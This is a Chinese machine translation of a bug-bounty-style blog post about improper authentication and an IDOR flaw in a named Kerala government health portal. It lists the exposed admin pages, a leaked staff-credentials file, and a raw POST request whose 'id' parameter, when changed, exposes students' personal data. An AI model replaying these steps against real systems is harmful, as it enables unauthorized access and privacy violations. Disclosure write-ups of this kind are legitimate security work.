<html>
<head>
<title>How I Become a Government Official Using a Vulnerability.</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">我如何利用漏洞成为政府官员？</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/how-i-become-a-government-official-using-a-vulnerability-4605a2db47f0?source=collection_archive---------1-----------------------#2021-11-08">https://infosecwriteups.com/how-i-become-a-government-official-using-a-vulnerability-4605a2db47f0?source=collection_archive---------1-----------------------#2021-11-08</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="0d57" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">嘿伙计们！又是我克里希纳德夫·P·梅莱威拉！如果你不认识我，就去问你的谷歌助手“谁是克里希纳德夫·P·梅勒维拉”。</p><p id="d84d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">今天我带着一个新的喀拉拉邦政府门户网站的漏洞来到这里。它被称为AHIMS门户网站，这是喀拉拉邦政府的一项倡议，目的是在covid危机后学校开学前为儿童提供免疫增强片。</p><p id="5751" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">该站点容易受到不正确的目录访问，也很容易受到攻击</p><p id="e3cd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">重现漏洞的步骤如下:</p><pre class="kl km kn ko gt kp kq kr ks aw kt bi"><span id="d7c7" class="ku kv iq kq b gy kw kx l ky kz"><strong class="kq ir">Vulnerability: Improper Authentication + IDOR</strong></span><span id="4170" class="ku kv iq kq b gy la kx l ky kz"><strong class="kq ir">Impact: CRITICAL</strong></span><span id="8d33" class="ku kv iq kq b gy la kx l ky kz"><strong class="kq ir">Risks: Attacker can visit restricted pages (Including administrator  and staff pages) and able to create, modify, delete data.</strong></span><span id="bbe1" class="ku kv iq kq b gy la kx l ky kz"><strong class="kq ir">Priority: P1</strong></span><span id="2f3f" class="ku kv iq kq b gy la kx l ky kz"><strong class="kq ir">Scope: Name, Aadhar Number, Address, Phone Number, Date of birth, etc.. are leaking.</strong></span></pre><p id="5970" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">从攻击者的角度重现不正确身份验证的步骤:</strong></p><ol class=""><li id="2f45" class="lb lc iq jp b jq jr ju jv jy ld kc le kg lf kk lg lh li lj bi translated">【https://www.ahims.kerala.gov.in/ahims/pages】拜访<a class="ae lk" href="https://www.ahims.kerala.gov.in/ahims/pages" rel="noopener ugc nofollow" target="_blank">T5</a></li></ol><figure class="kl km kn ko gt lm gh gi paragraph-image"><div class="gh gi ll"><img src="../Images/b2672c3b14ad1825206ea08f97c0d60e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1198/0*U-5W7Yu6mqnwAC9S"/></div></figure><p id="6ae2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这是第一个漏洞。在这里，公众可以访问所有模块。没有一个是经过适当认证的。因此，攻击者可以进入每个模块，改变每一个数据(实际上，所有这些功能只有管理员可以使用，但由于这个漏洞，每个人都可以这样做)</p><p id="63f6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">它还泄漏了一个名为报告的文件，其中存储了所有员工的登录详细信息。因此攻击者可以成功地以员工身份登录。</p><figure class="kl km kn ko gt lm gh gi paragraph-image"><div role="button" tabindex="0" class="lq lr di ls bf lt"><div class="gh gi lp"><img src="../Images/5ab4ccf44c68dc6930f2b5051c4c2a46.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*v7SrIpQn_rT9zypK"/></div></div></figure><figure class="kl km kn ko gt lm gh gi paragraph-image"><div role="button" tabindex="0" class="lq lr di ls bf lt"><div class="gh gi lu"><img src="../Images/ade252efed3c623ad339390843f593b0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*-BRxiaUZLxcztq-C"/></div></div></figure><p id="5803" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">从攻击者的角度重现IDOR的步骤:</strong></p><ol class=""><li id="3692" class="lb lc iq jp b jq jr ju jv jy ld kc le kg lf kk lg lh li lj bi translated"><strong class="jp ir">在</strong><a class="ae lk" href="https://www.ahims.kerala.gov.in/ahims" rel="noopener ugc nofollow" target="_blank"><strong class="jp ir">https://www.ahims.kerala.gov.in/ahims</strong></a>上注册</li><li id="3bd7" class="lb lc iq jp b jq lv ju lw jy lx kc ly kg lz kk lg lh li lj bi translated"><strong class="jp ir">登录它，然后我们会得到一个选项来添加学生那里攻击者输入假数据并提交。</strong></li></ol><figure class="kl km kn ko gt lm gh gi paragraph-image"><div role="button" tabindex="0" class="lq lr di ls bf lt"><div class="gh gi ma"><img src="../Images/1f9e677fbbd63c92ae959a9fd32b345e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*r06hGzTZ5y1cyu4j"/></div></div></figure><p id="fe40" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> 3。现在打开任何网页拦截工具，如burpsuite，点击编辑按钮</strong></p><figure class="kl km kn ko gt lm gh gi paragraph-image"><div role="button" tabindex="0" class="lq lr di ls bf lt"><div class="gh gi mb"><img src="../Images/675680afeaddf870dcd4168b5e2ea39d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*Bbhu3SYYYyJLDCKL"/></div></div></figure><p id="001e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在攻击者会在burpsuite上收到一个帖子请求，如下:</p><pre class="kl km kn ko gt kp kq kr ks aw kt bi"><span id="5c48" class="ku kv iq kq b gy kw kx l ky kz"><strong class="kq ir">POST /ahims/pages/jqdir/jq_getsaved_students.php HTTP/1.1<br/>Host: </strong><a class="ae lk" href="http://www.ahims.kerala.gov.in" rel="noopener ugc nofollow" target="_blank"><strong class="kq ir">www.ahims.kerala.gov.in</strong></a><strong class="kq ir"><br/>Cookie: _ga=GA1.3.1639422503.1633161064; PHPSESSID=itb0aia4ilb5152d76j7bdbmq4<br/>Content-Length: 9<br/>Sec-Ch-Ua: “Chromium”;v=”94", “Google Chrome”;v=”94", “;Not A Brand”;v=”99"<br/>Accept: application/json, text/javascript, */*; q=0.01<br/>Content-Type: application/x-www-form-urlencoded; charset=UTF-8<br/>X-Requested-With: XMLHttpRequest<br/>Sec-Ch-Ua-Mobile: ?0<br/>User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36<br/>Sec-Ch-Ua-Platform: “Linux”<br/>Origin: </strong><a class="ae lk" href="https://www.ahims.kerala.gov.in" rel="noopener ugc nofollow" target="_blank"><strong class="kq ir">https://www.ahims.kerala.gov.in</strong></a><strong class="kq ir"><br/>Sec-Fetch-Site: same-origin<br/>Sec-Fetch-Mode: cors<br/>Sec-Fetch-Dest: empty<br/>Referer: </strong><a class="ae lk" href="https://www.ahims.kerala.gov.in/ahims/pages/add_student.php" rel="noopener ugc nofollow" target="_blank"><strong class="kq ir">https://www.ahims.kerala.gov.in/ahims/pages/add_student.php</strong></a><strong class="kq ir"><br/>Accept-Encoding: gzip, deflate<br/>Accept-Language: en-US,en;q=0.9,ml;q=0.8,hi;q=0.7<br/>Connection: close<br/>id=668944     //IDOR VULNERABLE</strong></span></pre><p id="caee" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> 5。在该请求中，id参数容易受到IDOR的攻击。如果我们将id从668944更改为668933，攻击者将获得id为668933的用户的详细信息，而不是id为668944的用户(下面是3个样本证明数据)</strong></p><figure class="kl km kn ko gt lm gh gi paragraph-image"><div class="gh gi mc"><img src="../Images/6078601e77d52be7352a79500a9bd946.png" data-original-src="https://miro.medium.com/v2/resize:fit:1150/format:webp/1*1JIKu4RMijgRvQwXOYF_lg.png"/></div><figcaption class="md me gj gh gi mf mg bd b be z dk translated">学生敏感数据</figcaption></figure><p id="3248" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">很快又会有另一个弱点</p><p id="024a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">根据我在2021年10月27日的报告，有关部门正在修复这个漏洞。</p><p id="e7f0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> <em class="mh">别忘了在medium等社交媒体上关注我。</em> </strong></p><p id="2779" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="mh">我的Instagram手柄:</em><a class="ae lk" href="https://instagram.com/krishnadev_p_melevila" rel="noopener ugc nofollow" target="_blank"><em class="mh">https://instagram.com/krishnadev_p_melevila</em></a></p><p id="33f8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="mh">我的推特句柄:</em><a class="ae lk" href="https://twitter.com/Krishnadev_P_M" rel="noopener ugc nofollow" target="_blank"><em class="mh">https://twitter.com/Krishnadev_P_M</em></a></p><p id="c3b4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="mh">我的LinkedIn手柄:</em><a class="ae lk" href="https://www.linkedin.com/in/krishnadevpmelevila/" rel="noopener ugc nofollow" target="_blank"><em class="mh">【https://www.linkedin.com/in/krishnadevpmelevila/】</em>T5】</a></p><p id="2925" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="mh">我的人事网站:</em><a class="ae lk" href="http://krishnadevpmelevila.com/" rel="noopener ugc nofollow" target="_blank"><em class="mh">http://krishnadevpmelevila.com/</em></a></p></div></div>    
</body>
</html>